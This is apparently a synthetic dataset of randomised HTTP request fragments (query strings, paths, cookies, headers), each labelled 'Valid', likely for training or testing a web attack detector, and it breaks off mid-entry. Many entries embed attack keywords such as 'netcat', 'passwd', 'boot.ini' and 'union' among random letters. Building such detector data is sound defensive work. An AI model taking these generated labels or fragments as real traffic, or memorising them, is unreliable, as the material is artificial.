#  {'type': 'Valid',
#   'request': 'zt=coespssSoereattxna&t4cvgherjulOht=697971135&ktnpSeh=%28szeasesHtreiuafto&edhi5rmtd7=idrozea6',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '9emdoEuSeisIih=tw3yNmMWldYZ&twosnfdriaNn=933215836&n1gSoth7anylre=43749&7jm8erhgydc=aaus0rc7odriN&libvibw=546hLgeMh&zD.nHWcatyw=%28kq&weiNt=691617485&2aes2pt9M=2585&2_Crmselecto=upotbTsIaae',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': '/li9.html', 'interval': None},
#  {'type': 'Valid',
#   'request': '/tXHou9o9/rrEDOkF/cp7Lh5D-J0yS7lC@l8/oaP/7sMY.mdb',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/htdQyevzcylei/fhotioh/h_TrD@jseqk9DiNd./wiiHoET9seenr/nea5gasbeeiInyOq/mpaxpprbaIba/iliy9rudaipE/twH.jpg',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': 'gzip', 'interval': None},
#  {'type': 'Valid',
#   'request': 'inntlhgAIHfri=6067575&Wk1AmGcmd=t0sckceetsaoe&vtm6ruye=aY.EpUg0SB&6Zgutie92=4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'oTar2cwsa=41378&betweenPfroma=lsOafe1gilsea&yNAK=702349552&6tEttittc=6r4osot&IRbh0omqhn=liba&Chnhts=9507&eEe=h5iYiij+nr&w2tsinscyndo3it=tjTZ7zB&eqngneTsimEtc=37&tt2I5eeeFsir=37238&V48slittuehEeg=+a%3AbP&beNc=073116295',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/r@58tUKm@MSy/s6Hq1s/enczilazaeo/ObBg7dWixOwgetbNEstdin/2Zluq3K74D2NlfTI58m.jpeg',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'alrshh7wttgelkt=tmpl3d7fqdu%3Bnf%7Eolei&sWrd2ms=51701296&MZ7QUkfGMm=r5rtNlGaiaoh&netcat865cY=w2&oonToaou=47612',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ntHbdet/izfB7D/0VmCFjs8AIw6@nposition/Erbnrwflias/l1/7rpaRnoiaaushn6.png',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'PTJzhtaccesQHf=7736442&pcectrp=76&esyd=37E&inec=cre3haeeNqove9b&A80Ko3s=trcp&hoSmea8itbe0ch=mLfBscfOgrlsr9ed',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/fzMSN_Lgql/dNRVwsqQOb/3htaib3oCedofeNf/eqQcpQv8/anom6rhEleie/D0OQXsamdbperlve_/dU73xfXi7EIfhNNwZus/aXNSkp.php4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'aet=027785&a0Gn=o-J7QZcTe&hieehazhoCi=4&JOAUDnhNE_t=eeomtdAs&aienleatpztm=35565&ca=ubxwOs%40UM-be&v0hsztsl=09&isEisia0U6bea=Dnaa3na6mYf&tSnedh6=02952&nnatheIpf=iP9Oq',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ogtoik=+tr2nr0rB%5BdlsI+p&EformBwgethqp=vkmjsmoi&ek4mee=2Ace&ennqippe=5852082&hoe1r3V5pgE=teH06g&htiofaxt7te=r&Xexec5-8v=atGdy%3El&e0mfaSdao=070001&bjstyleP.NX=%27+rr&tSnuea=erO3hsa&miqaldwz=tj4x9cjIon',
#   'interval': None},
#  {'type': 'Valid', 'request': '/fqEkrnCYL4pp3sY/R0dimg.js', 'interval': None},
#  {'type': 'Valid',
#   'request': 'zn0-M=++is&ai=6981897657&els788drda=fr&vam9ce=7slVbDehh&nd8enhonrtesr=n-l%2Bn&I7xX=el6&au=H0r7',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Da5izrnh4x=cul&wtni8snind=mdsthsheaeenE&tnwoDhyu=o+riemaila%2Frtv&wnaakslo2een=131&odyc8shek40mcn=631&sseiho=regi%2F&passthrubfQfI=l%3EaNua&l3uPEdtrIle=ked&mEysclett=8329269404&vn2ueehh6Ksft=rsdsoeee9l&xt=ea%7Een&ioedotMYet=54',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/boorcc/ur2htew7ircyedoOu/rkU0DOn6XusZOx3L4drL.exe',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.0', 'interval': None},
#  {'type': 'Valid',
#   'request': 'leie6v=tJwUMEuurA7;RGcLbingdelete=%3Cy%3Fdrop',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/hrtegsdrim/emqNG0Kzlxhv.gif',
#   'interval': None},
#  {'type': 'Valid', 'request': 'deflate;q=0.4, gzip;q=0.3', 'interval': None},
#  {'type': 'Valid', 'request': '/haOtljeEeH.shtml', 'interval': None},
#  {'type': 'Valid',
#   'request': 'D@rmQusr4JxA=05604000;Zd1wgetxJU_vO=nmochart7y5Af%25bHoq;lctdy0ie8nc00=oDquS.;ptaaym3h2uhni=s',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/7.1 (Machintosh; U; Mac OS X 2.8; we-OE; rv:3.7.7) Gecko/70280092',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ip0E8wvbipi/rmh/ah2Fnj/Awf5mz7qgaAw/rRnbeebvitnbweiimoh/mNGKsaS/ir7wHuD9X_yAo.cZ/f4kxQ0qDuiThP-By/tsi2ma0oDcfpssrd5ye/4lt0i.sh',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/mVktomU2D_214/h9-k1fiS9wFqsIL0/bz59_02yl55mTCmJ8sw/e_EIMhZiiPjQ12x/tqtdlyilienheSiui9/titxe.js',
#   'interval': None},
#  {'type': 'Valid', 'request': '/Tv5XpFX.exe', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ntptui/p2EC5q/ttite1tbreltotpatr/lH.css',
#   'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
#   'request': 'ieitdeogrl=3175269;Mxp_lcugb5IP=rs;eeoi8arer=6;C1log2Nsystem=1rE',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'SaiuinMbEdari=fa4yeiipefa&sgieyjtkamy7o=k+eix%25&.iY-umochadxY=364709&a4tiostvfoGaex=43&oktlrsdebdrcke=7933&3tuvoeeA=roae&ct5b1veZnepxhn=85396929&tTfpaobihnai0O=7144788540&drgc4i1adOsI6jo=eeathS4pnt6&lS0Eimi=pec&U0rc=1&ialieideGet=227',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/wRTPGTjRAW5gE/o.S4jPFRUI3N55/hS83E5_w_4FguF7IA0/reaanki7odr/oODmoqZlMwDEZ6W/eqtiunbec/o.BE-p_dq/tafebTnndnh1rpitleu/mteAhvH/IfMcDULmT_insertSm8.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '6y=me8npenp&r7l=12860&nda=linm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/3.0 (Windows; U; Win 9x 2.3; xy-gl; rv:6.5.9) Gecko/22561508',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/phpX/j--Pp14/gt2CRdihli1lpqs/oufCQPH9caXo6d/3terwtocrh/tN.H/aAq2Kuz_zxxvwf/0Msf/sim3datmin.pl',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/netreeAJYdooeuar/enroeibsE1/gLT/t@open6/mXUZyfZiycV/-@/0Lp-zn0Jq00@A3ga/s.Vd7MD1/hJXALwwAotBtWwMe/lDR3..mdb',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'xo1tXJw.scriptxe=etwe&aknadec3d4=aE&GPfqIO05T6Ef=b6eneH&ieEs=386&ienh=apMemaisj4ermnt&5rtqnusswe=Abincsr&ee0=gnxieadi',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'anRBV2npsHinsert=r5elocationehqosa&tng=ocxmooEhrdsnduau0',
#   'interval': None},
#  {'type': 'Valid', 'request': 'yftgT/0.8.9', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/4.0 (compatible; MSIE 9.0; Solaris; tenrl)',
#   'interval': None},
#  {'type': 'Valid', 'request': 'ysQhoriaalXr=paerigt5+s', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/9.1 (compatible; xeitahci; Win 9x; cdsisg; NseaeTl; 1htieai9d)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'rkrrfoz=10160&aek6d3zdyketm=ypuo%3Eayss',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.3', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.8', 'interval': None},
#  {'type': 'Valid', 'request': '/veee/wH2W.jpeg', 'interval': None},
#  {'type': 'Valid',
#   'request': 'swlhnonhf=stcfRn&7TlogaSVXPdo=423&@VWYjeKrLgmetaN=nhs7eo&eccrbt92eobl4t=ccsu',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'l4bNeree111dRn=6nMsu;bFofya=603429;tmnhtaeoWuo3=242185',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tB4LTyhJTb2S2dN/efyoWP_extPs@woRS.asp',
#   'interval': None},
#  {'type': 'Valid', 'request': 'mefirlivpe1ono6', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ZCF/aAno6neieslf8nAht/e335c2o0g.cgi',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/driIneaho94reied/to-AWoIOo@9/gE9r-OhQRWNJ69.NocR/ctOhl@TT_S.WRX.gif',
#   'interval': None},
#  {'type': 'Valid', 'request': 'm5eseddydn', 'interval': None},
#  {'type': 'Valid',
#   'request': '/sXdeleteXsRSh6Gyscriptp/iy-PDEQewR/Ki4p8evalinputvadmindaL/oiaz7ncifsrenowoul/7KformBXVupj/USibrRRscripto/aenEu/1I.dkoXjqMchNPO56q.sh',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'hWStet14wy=efjurbsncSiSt9Sj5&oNhude=wq&gcer3jjqgi5u9d=fjeXF28YZ&PO8bgsoundG_n=r7N9kR4v62c5&ir=eria%27&etscy=2&rheLono2talcl=sslogntdaiqatZ+e%24e&_jICcatBhdrop-=mHpmfDb-9',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'tbtvedr-Ah6dh, ll-adioekh;q=0.7, e-bhi7n, eyh1Eel-iue;q=0.0, t-br0SrReE;q=0.6',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.4', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ddselhIy/d3p/sDfrdtMRe/dF4AdPCswmYmH5vv/nph-LxcK6.-sjJ6OUI/ePoPyv4kHFg5nCgmv-/wiereeadahod/yliNna.htm',
#   'interval': None},
#  {'type': 'Valid', 'request': 'hlvniORseluoe5elllnh', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/0.5 (Windows; U; Windows NT 6.2; sa-Tk; rv:4.4.1) Gecko/56324033',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ohmoa=Rori%7Elra%2FnNs+;rm=42',
#   'interval': None},
#  {'type': 'Valid', 'request': '/f08MSmiyoV9K.asp', 'interval': None},
#  {'type': 'Valid',
#   'request': 'uur4em7sismsd=giitrmv1omii9e%3F&RojsamC@E=462682&daUeet=pincludenehtpass+%28o%24t+E%26zshutdownse%24s+&itrtinpm=t8',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eomtJs.TP/huldySedveuvine/oyFaqP-hyK4N.cl/ClikrzfHsnmote.shtml',
#   'interval': None},
#  {'type': 'Valid', 'request': 'ioei9=iee;geigaOhpee=ish', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ax0/apceAlpb0Wa87rfet0l/2XyimGX.Sy7fAeCXxU.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/osAhgeAa9aeueA5auian/orKhNnrCto9ppet/pEtouOhb3brsow.shtml',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Aq=eathtO%5C%40mOwt&baThk=37382&Escriptrx2-D8k=tmpph&rleWh9m=sdfzeaiacmdc0y&htoze3au=orn%40&qvYCzA@ZG=eaeahSedpusseeen',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/k3e9HGlYh-R3/eGPEhkVsxblXjNkk3u/rsoIktgjs1ai/91G8CKGa6DaQ4D4_kQ9s/90wl7/srGtistdsrnah1/9lFJX3/palc5otrNy3tn/@nodetfTX.php4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/uhNihe/st/ekjsRNUeXwHR/d1KMkAU/ngISHekMX@0vqCE/6vD0O9ksQ2A/xGhnrdkgenucQaAdi/gq09Dr4/tqe-_q45EDE/t8ssjhgnhenmilkua/exrsytpiNcieeem.gif',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'b4am=so%5Dn%2Ba9dropeoobject+e9&Nthlttooe=ufemoqci&eH4include.n-zboot.inietcZt=zbsisulwarcyheeiS&eawntDxeahygne=0892&t9qn6dh=%5B+w&neoiweou=resr&EtaaefiO=srg&2sN7g24h5--=aaip&hrdAa=iee%3E2i&lnpePOsa=87096&iuNan6ens=olhfAaaimrh8kl&gts9jutIevaenj=noi',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ovrsufDsrtsseoafr/rxretzosnnt/iZNF8@Fm9kh/dqd8Ev/IEprocessing-instructionP6X_9/bp83ioeosrnttn8kb/tsueu/hEbTmWE8BIGlDb.R.js',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.9', 'interval': None},
#  {'type': 'Valid', 'request': '/mmE.sh', 'interval': None},
#  {'type': 'Valid',
#   'request': 'tnswtAaow=%5Bhia%7E&ihttsar=ejI8r&MFujmFFz=1749&tk=x%27nnTYn%2F3O+on%2Fe&tvsit=2vscowll&vs=lkeyiaf5%3Aoroh87&etI9nel16ryta=Ptydcebesr%3E&beaa7ldceycalah=0B2ri&iiopse=euh&ubrctLsornojeCs=o+&Wc8=0&98gdusmya=ma1ek&qEese9=ttudyeeaqempe&oAn3NyitPw=E4j',
#   'interval': None},
#  {'type': 'Valid', 'request': 'gyLM=crk%40ochhavingo9nir', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.4', 'interval': None},
#  {'type': 'Valid', 'request': '/adxwQGX/eEmss-.htm', 'interval': None},
#  {'type': 'Valid', 'request': 'no2-otulho;q=0.0', 'interval': None},
#  {'type': 'Valid',
#   'request': '/ecTI3Um/sqk-qPWVcsqRkm/etbnitpcRoDuNeO/tnltsxaiHioedm/cn-JVanxxeXw/0io0qh3rheeoNh/Jfdocument2usrDm2/3yvNRV33xxuJp/6XAinhtOyuaZedd/p-rse-ym66eZq/ryU7p_Ml6ol7hVTFS.htm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'FLlctFFmZ=eo%3Br&ldo3csl=edpssrahy&bviBlataaydS=46&mOagO1vRJf=seNrqrelpc0etm&hyxed2epr=8189245&andHAP1M=mesyTso%25u&useyrsdt=kUoJl_%40G-C.&wriioh=0teo%40f%5Dye0a%5Ciathbeupdate&CwaEdtrtL3=dyGU2A&PchildMtNU=7i+e&WPgil=dReni&lolaIoeaseo=061967',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'erttn5eylrpl=sT&RMPMwZ6=dn&obu47bSiieemF=mohk&ee=0-Zddm&aMeiiun65Swzr=fni0',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/6.9 (compatible; MSIE 2.3; Unix; achlpecsie; LYoies; yya7)',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/iZENgvuKA/Hz31M7_Q/obdq2tLmmnle9senurdn/UDJxE.bin',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ekoh1qtRbkoSis/2dssusvali/hdeoetirte/eNODjNuNO-5LoNaD/ae/aE/owepstmmbsmo/BPmM7/rEiAe98VJzUNA/a-KNAQKlWGz@HK5n-b/y1rOJ_Q1Vg77/gktGeU2eR1.htm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'OiohomhyneAma=%7Eswyn&co=swIbhsreoys0rc&epse=tkxlY8&nsfrnjn7tmsaie=oaiar&pehi=rD&vxa=163778&Zsock_streamiAZaccess_logqformJFeI=204&LFjh4_fZRS=6040&8tgynfacnanmi=4991324&r9lwerttyelbmoy=6iheHm6&Osoie3enli=AnftnNqnHwmur&b1oRixegweSo=373065&echom50aQ=connectel%24wnullvaryu0aincludenhltut&odrjem=between%5CDiae0t1advh',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/n_.58ZV7WHeGiXDT/lLDpG/r7Wu@/fRIp30JS/6fJW86kiTU9zcyXY1v/OSetMsrnqwet.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ocso0=kOU&ehuaero6nd=iiI&8tesiui=evIy&0ctIaye4y=rfydCl',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'lDrDCcttnny=1&siuiiyxseoe=gfdiuOtExr6php%5C%3Df&GsacIWIC.Mcmd=c%25t4updateushutdown%5Ct2-ttIaEpe&srsi8dft=niaB0imqeee&iyleA=tHnEeXEq&elfnkm=ERiodjemnc5c0etc&irermoI=fspjT&v6eeeswdir5=953&hbdtecnwth=1356&stt=679&GBKIya6S6stdinV=4&oiclnqtt6tsa9=ftpe&wsbMissio2=8468&zueufaohr7p=iiem1mmhEsn1voc&tyfno5i4ai1tent=3',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'la=s5n%5Chse&awam5e=titaes%3AblnkeaO&lQe=gnopene&servicesxtermYTSa=e%3F&dsxoajhmp=a%28oypasswdcopytaa3eo&3ifo1sS1aaL8=81232&5oco1et=2891',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'e6ei-een;q=0.2, e-aeub;q=0.9, c3e-Erj, Tm8ue-bgdc7wm;q=0.2',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'rstaononseti=287&6eghpfsogRHheji=+edt&o8iilsraDtls=evaleN%3Bv&dzo0g=89&rcid=union%2Fn5upesg&nldbxsdedqnye=stAC&nit=0&rlIa=Ditsso4drhece&pb=+2m4up%283thIscript+baWu%5C&iorillm=mevmbebgsound6l&vknthr=snOm&9LN9NozEw=c0g',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/im4ueblRe2dephIwq2h/6XOSINa@LDgR@qRaDt/Fb/rSMf/bwoe6phDeO8enloats/a97VTUmuaybTgCDHvGZ.html',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/ct6eqhsNodnnhaai/kU9anph-EY.X_/mm.X42oBlRwR6/eBvolZGoxKW/uLOeig8eDegtnabzl/uthgnudiWOgdoj6/htleirEuw4ne04ze0Tr/s7kjj0a/vyTetwe1nniu6eo5tiEy/e4geSlnabioldtd/a1LGD.cfm',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.2', 'interval': None},
#  {'type': 'Valid',
#   'request': 'compress;q=0.6, identity;q=0.8, identity',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'SMwoGrsyaa=ascsq9relEr3pnsie&eeftel=806365&Aiphntme=r%3Cuinnetcat%5Bv0Xcr4e%28ue2n%3D&ijaeths7ijjup=8414&ueferoSs=edboot.ini2etupdateehrTnl9ecglogIn&@wmCunionKaLlHEv=2nbc6exTtnnTftah&trest=933',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/5.4 (X11; U; Unix 0.4; og-Tv; rv:8.1.9) Gecko/50977397',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/2u5in@2/nbinKAAO9SCUHQ8/awearcetitnL6ntsUay/v9YMkh3ijTG1/DUbnD.HqKDW4enode/eKIn97@.6IugUzdDfD/XzOV_rdopt7sX7R/cybjs/lcte7s4tnekk/rCguY-V/lrdvo/oni7.gif',
#   'interval': None},
#  {'type': 'Valid', 'request': '/h6aiyjt1@vFXSDaqF9l.png', 'interval': None},
#  {'type': 'Valid',
#   'request': '/datlmuaa/sijlm/vIYT0abu/de02blpibmnt/l6sNv/d5Liodthtg0enwdoEDs/5is_heiksZw7fXDy.l/ikp7swaer0z8atdNyo/rZN85l3qgyMRB.png',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/Uchild_t/t3Z1_dYvLgD@qh/nY.xAu3Bh46lwPms/diw/UsnvDa3nlgtlhauxr/ftadfidsp1nmErWug/tY8Ay.htm',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/0en/sxymfML-Zl2kTY87s.Y/h8sytbnSrdlhrk4er/hVDhwtdaMNwOIo/hEa3tf61gTdLFxX@/EtieqDnio/gstyle0./ZR2_MXUO4/cR.png',
#   'interval': None},
#  {'type': 'Valid', 'request': 'h-80iee', 'interval': None},
#  {'type': 'Valid',
#   'request': '/cA1k7a7rsih1Nayteree/mtsl0eieirdn9/ksp2nhcIa/i3s2oOzide/sb3/aJuZ48Sir7_O.g8/5paosdartainthh7et.shtml',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Rreneostc5wg=+%7Cs;l1http0V6V=r5xUb;ntV7ott7s=tju0A',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/6f/cvystttueGniscyuce/aXE8/cMakPlyHu/bdtignto.jsp',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'BoopsG7EXBk3P=+;YwX3@AOtoBg0=%40%3Csystem3o4irltnE;8w=3587;TVimgyS=s2lSrzSeuto7',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/4.3 (X11; U; SunOS sun4u 8.2; Hf-me; rv:1.8.3) Gecko/04692964',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'hN=xMtrkh&elwe=riI&iq2dEuwj=qAiyQzieam08h&lseaab5jtoijoow=sIu&H6bD.BFselectP96=nnasheo%40lCeaDwh&ebrgpht9nv=nsR&tee6er5om7pexqe=%24qb++cmn%3FnUrsswcetoinclude&updateYostyle=xaaioEaoawdhelts',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/5.4 (Windows; U; Windows NT 1.4; oi-ce; rv:6.3.5) Gecko/46788532',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'identity;q=0.7, gzip;q=0.0, gzip;q=0.0',
#   'interval': None},
#  {'type': 'Valid', 'request': '/t7ko.shtml', 'interval': None},
#  {'type': 'Valid',
#   'request': 'IGKshutdown=1rpu&oshuRh=256216271',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/anftatOacar/mBmtasetlude0kct/eKV/qsoscrvnAoadfgpiaEn.cgi',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'tfegeowoauf=55q&oiiortva=43&o3=6296&2eauk75drtnit0e=ecoejee%24&a8eBoh=nfsjShzA3daretNalw&bup=6440&HIeu=%26osjaoirhsa&JH9@MBH8fzDW=It1&Hfgno=431574&o2SwinntOx6U=oTnph-ehscript&OiLawtRclOsn=nNoyea%5Dscriptri&oaesno7c9tcDt=484279&rUBEa4Z=41751787&otulanrprsoht=97542&hsieieonf=eTbZOQ8q',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iycesrtpmLmkp=125&monaafydhuq=600&ddtroEeces9np=E&ro3Qftn82scai6n=oax&cE=kEni&mefadwni=oeu0%40dSk0l&obnh4=Nieoauohm&n5CyrdomSn0nw=ngnnCt5f6jslotm0w&omqeaesojhiua7=2%25ne%5Dun+cccs&ztarjeDe9h4safk=ojyOdFO&tEgee=%7C%5Csa&XsQ65=l7oEDQJ&tMtfeit18mettt=761',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/a0IM0l4B4bCEN7MKJ/eRu9oOooetna/AstylewObodydAd8P/aIeyUe8fiuncg/ensowtnevxyu/t.V4Q3.wydYcpiCb/tpiysafeeic/iCIbjzKX/4tlnia82aaitseenH/ehetbeoirt55.mspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/rFkiTTzCD3nm/tkRXblQyP./ivBaccess_logq3uSkB@location4/1loB63saoweQine/6KGjHasQAm1w/rit/uCOb0B5yQ0_w/lwAX0lbNOWqQaTmyvLOV/emlCkYQ0noVO9EJs2/eolhsanutnn/p_r_q-ja.exe',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/kbAetm/So/0hze5dtvaaten/ai/updateDPynmocharcpI3Y/tVLqnQUuI/unk4FxBd4/5secrn/oQIh.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'ikOoekjnrhtr9=0725&WXF2DoptTIt0=625144715&s7snen=eby7%29ZepYb+8e&tl9noaeel=8&Ehpbhsit5lsr=as&1m=Mdl&peei3t=831768038&e2Tiakthc6N=havingLoi%3F&f@.QlKv3KKQl=sunion',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': '6bP0WPn=8256265039', 'interval': None},
#  {'type': 'Valid',
#   'request': 'g91enhat1=elsimeaate&gp0khqniie1=30146118&sservices23XSN2=%3Dy+&obngahOtC0axcf=%2B+&ersUpNhnshha=raeb%3Bsb&dheenncer=82&k7DR%uc5V=oz5p&F1esezmie5aaOtl=ao%25+dtnliioftr%2Frpe&er8a=mhe1cutsr&dmMiUw=94071&0oyte=7596&tehES=11865429',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'sesgls7uqiYieae=41828528;4fnpn79isicte=81;LGmail-m=chgtio',
#   'interval': None},
#  {'type': 'Valid', 'request': 'izfqefe7-eop;q=0.9, ho-bws', 'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/0.8 (compatible; xfodEeah7; Windows NT; rHtt; e4umebii)',
#   'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.2', 'interval': None},
#  {'type': 'Valid', 'request': '*;q=0.2', 'interval': None},
#  {'type': 'Valid',
#   'request': '/i87lq7cM/i9e@suhJX5oX.ux/iCYyvTD6Hb/cltrxeetalwxieapm0d/ejUs/oe6edafhandel3n/4ofkRsc80n5hTqXj6U/oflpoNruKiCpw-sX6f0J/aEot/sXjzQYGyjE/KCformu.pl',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/tehleafrS6trtut/RnotHsLaer5Yueit.exe',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid',
#   'request': 'sesgls7uqiYieae=41828528;4fnpn79isicte=81;LGmail-m=chgtio',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/eeshatvoeetrjvc7ii/rrzAo79YBz.9L43/2enhtgzsyaNeseraod6/3j3CFVCXechoNy1EN/omhoOnemaclsnvo/ontllhteih0ereaes.png',
#   'interval': None},
#  {'type': 'Valid', 'request': 'identity;q=0.7', 'interval': None},
#  {'type': 'Valid', 'request': 'w9dtnrdthqs5s', 'interval': None},
#  {'type': 'Valid',
#   'request': 'lwmHeqe6nhnoaj=Pm%3CoptnunreinsertTi9group+byyii%3D&Thmon18dm9o=8714',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/trioaIcyrToweuiaaSt/aw/rUcRH/namsseuoaRasorn22tf/acH7nkm8pQRSeG3lxcnB/fnwf/adSYH_NuFOe9-352LjN.asmx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'sesgls7uqiYieae=41828528;4fnpn79isicte=81;LGmail-m=chgtio',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'tHtOvluhthhp=r0D&enTaSznbanTsp=+%3FI+nehh&ViOHsrRoe=iHerhrtie2Rotu&1odrhoe6iWsjhv=6568442&@s.XLfC8Z=0.6.p&8otltrare6eide=tAal6eph%7ESiao%3Eg7e&mlle6=op0zNR&Il_5o4PM2Rm=750081&tltB=trje%40-&ketee=318283&toe8glEcu=+l%3Ftts%3A%2Bb8',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'Mozilla/9.4 (Windows; U; Win 9x 0.3; N1-3q; rv:1.4.3) Gecko/68924305',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/H99og92kSnqO/TKmzEM5iJmetapdUyj/MyiIp5DnhBPtmpusr@W/ekQQD2M/iswssk9vso/rgi2G/a4Itjxn.tiff',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '29v1tR1h http://www.ntDnre.com',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '4m-n3rcnult;q=0.8, anemyt-1hxsa;q=0.2, oondrsn-klqecaM1, drys-pes;q=0.4',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/CGLjVY02djinAms/hfebNfi/JOO@/NgMBiw7NXUN0O/tp-3/tj2NyFWDG3JsN@nZgwzl/aes/andaooannla9hI/MmFp8ZvcS/ea7tdgdadrreuf.aspx',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'identity;q=0.9, gzip, deflate;q=0.6, identity;q=0.1',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iex=58460828;Jhiphpof3Qcopy=ds1ciju%2Bbchildle;dnsaes6oibez=nadeHmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'interval': None},
#  {'type': 'Valid',
#   'request': 'iex=58460828;Jhiphpof3Qcopy=ds1ciju%2Bbchildle;dnsaes6oibez=nadeHmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'interval': None},
#  {'type': 'Valid',
#   'request': '/bztoptwindow.open4/bPboot.initp_5l/u2ceiaccsjii/pstdinULvMfBG/t8RoJGH4/i3taepwmfaa/qPWM.yDxrnG7RMb.MS.nsf',
#   'interval': None},
#  {'type': 'Valid', 'request': '*', 'interval': None},
#  {'type': 'Valid', 'request': '', 'interval': None},
#  {'type': 'Valid',
